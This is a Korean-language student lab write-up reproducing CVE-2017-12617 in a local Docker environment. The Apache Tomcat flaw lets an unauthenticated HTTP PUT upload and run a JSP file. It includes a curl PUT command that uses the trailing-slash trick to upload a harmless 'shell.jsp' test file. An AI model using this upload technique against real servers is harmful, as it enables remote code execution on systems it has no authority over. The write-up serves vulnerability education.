# Apache Tomcat PUT Upload 취약점 (CVE-2017-12617)

## 화이트햇 스쿨 3기 35반 편정혜\_9212

---

## 취약점 정보

- **CVE ID**: CVE-2017-12617
- **취약점 설명**: Apache Tomcat 7.0.0 ~ 7.0.81 (Windows 환경)에서 HTTP PUT 메서드를 이용해 인증 없이 JSP 파일 업로드 및 실행이 가능합니다.
- **공격 방식**: HTTP PUT 메서드를 이용하여 JSP 파일 업로드 후 실행
- **영향**: 원격 코드 실행 (RCE)
- **공식 설명 링크**: [https://nvd.nist.gov/vuln/detail/CVE-2017-12617](https://nvd.nist.gov/vuln/detail/CVE-2017-12617)

---

## 환경 구축

- Docker
- docker-compose
- 테스트 브라우저: Chrome
- 터미널: CMD (또는 PowerShell)
- 운영체제: Windows 10

---

## 실행

### 1. 취약 환경 레포 클론

공식 kr-vulhub 저장소를 클론하거나, 직접 CVE-2017-12617 디렉토리를 생성합니다.

### 2. 컨테이너 빌드 및 실행

Docker를 이용하여 Tomcat 서버를 빌드 및 실행합니다.

`docker-compose up --build`

이후 http://localhost:8080으로 접속이 가능합니다.

### 3. shell.jsp 파일 업로드

PUT 메서드를 이용하여 JSP 파일을 업로드합니다.

`curl -v -X PUT "http://localhost:8080/shell.jsp/" --data-binary "<% out.println(\"Hello JSP!\"); %>"`

업로드가 정상적으로 완료되면 HTTP/1.1 201 Created 또는 204 No Content 응답을 받습니다.

### 4. 브라우저로 JSP 파일 실행

브라우저의 주소창에 다음 URL을 입력하여 업로드 된 파일을 실행합니다.

`http://localhost:8080/shell.jsp`

이 때, "Hello JSP!" 문구가 출력되면 PoC 성공입니다.

---

## 결론

이번 실습에서는 Apache Tomcat 7.0.81 버전의 PUT 메서드 취약점을 이용하여 인증 없이 JSP 파일을 업로드하고 실행하는 과정을 재현하였습니다.
Docker를 이용해 취약 환경을 구축하였으며, curl 명령어를 통해 shell.jsp 파일을 업로드하고 브라우저에서 직접 "Hello JSP!" 문구가 출력되는 것을 확인했습니다.
이를 통해 Tomcat 서버의 설정 미비가 심각한 보안 위협(RCE)으로 이어질 수 있음을 실습을 통해 검증할 수 있었습니다.

---

### github repository

- 35반 편정혜 github 레포: [https://github.com/rainyhye/kr-vulhub](https://github.com/rainyhye/kr-vulhub)
